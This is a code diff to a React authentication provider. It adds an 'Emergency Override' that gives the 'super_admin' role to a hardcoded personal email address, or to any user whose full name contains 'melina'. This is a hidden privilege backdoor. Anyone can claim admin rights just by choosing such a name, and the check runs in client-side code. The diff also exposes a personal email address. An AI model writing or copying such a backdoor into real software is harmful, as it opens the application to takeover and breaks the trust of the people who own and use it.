@@ -67,6 +67,10 @@ export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children
         .single();
 
       if (!error && data) {
+        // Emergency Override: ensure owner is always super_admin
+        if (data.email === 'melina.figueroa.89@gmail.com' || data.full_name?.toLowerCase().includes('melina')) {
+          data.role = 'super_admin';
+        }
         setProfile(data);
       }
     } catch (e) {
